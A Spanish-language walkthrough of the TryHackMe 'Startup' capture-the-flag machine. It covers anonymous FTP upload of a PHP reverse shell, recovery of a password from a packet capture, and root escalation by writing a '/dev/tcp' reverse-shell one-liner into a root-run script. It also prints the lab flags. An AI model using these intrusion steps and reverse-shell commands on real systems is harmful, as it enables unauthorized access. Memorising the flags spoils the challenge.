# Startup

## Escaneo de puertos

Usamos la herramienta de`nmap`para mapear los puertos abiertos disponibles en la máquina víctima.

```
sudo nmap -sV -T4 -p- 10.10.32.165
```

Tenemos tres puertos abiertos.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image.png)

## Acceso por FTP

Entramos mediante FTP de forma anónima.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-1.png)

Nos descargamos los ficheros que hay disponibles.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-2.png)

La imagen no parece nada relevante de momento.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-3.png)

Aunque tenemos un posible usuario en el sistema:`Maya`.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-4.png)

## Inspeccionando el servidor web

Accedemos al sitio web para ver si hay algo importante.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-5.png)

Usamos`gobuster`para identificar posibles directorios ocultos.

```
gobuster dir -u 10.10.32.165 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

Encontramos un directorio llamado`/files`.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-6.png)

Accedemos al mismo y vemos que tiene el mismo contenido que vimos por FTP.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-7.png)

## Reverse Shell

Podemos implantar una reserve shell ya que es un directorio abierto vulnerable.

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Ponemos nuestra IP y el puerto y guardamos.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-8.png)

Abrimos el puerto en escucha.

```
nc -lvnp 1234
```

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-9.png)

Subimos el archivo de la reverse shell a través de ftp.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-10.png)

Volvemos a la página y en la carpeta de ftp tenemos el archivo subido.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-11.png)

Simplemente hacemos clic y se quedará cargando y hemos obtenido acceso.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-12.png)

Obtenemos un shell mas estable escribiendo`bash -i`.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-13.png)

Inspeccionando el contenido encontramos el fichero que necesitábamos de`recipe.txt`.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-14.png)

El ingredientes es`love`.

Vamos a la carpeta de`incidents`y tenemos un fichero de Wireshark.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-15.png)

Lo descargamos copiandolo a la carpeta expuesta en el sitio web.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-16.png)
![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-17.png)

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-18.png)

Seleccionamos cualquier paquete TCP y le damos a "Follow" y luego "TCP Stream".

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-19.png)

Encontramos la contraseña de un usuario llamado`lennie` que es`c4ntg3t3n0ughsp1c3`.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-20.png)

## Acceso por SSH

Usando estas credenciales, accedemos con el usuario`lennie`.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-21.png)

Obtenemos la flag del`user.txt`.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-22.png)

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

## Escalada de privilegios

En la carpeta`/scripts`hay más archivos importantes. El de`planner.sh`vemos que el propietario es root

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-23.png)

Y ejecuta`/etc/print.sh`.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-24.png)

Usamos`pspy`para comprobar los procesos que hay funcionando del usuario root.

https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

Subimos el programa a través de FTP.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-25.png)

Esto es necesario porque no podemos usar`wget`desde el login de SSH.

Generamos una reverse shell para el root.

https://www.revshells.com/

Insertamos el payload en el script que se ejecuta cada minuto al parecer.

```
echo "sh -i >& /dev/tcp/10.2.41.173/5555 0>&1" > /etc/print.sh
```

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-26.png)

Abrimos otro puerto en escucha y cuando se ejecute el script, tenemos acceso como root ya que el script como ya sabemos se ejecuta con permisos de administrador.

![](Hacking_Etico/TryHackMe_WriteUps/Startup/images/image-27.png)

Tenemos la flag de`root.txt`.

```
THM{f963aaa6a430f210222158ae15c3d76d}
```
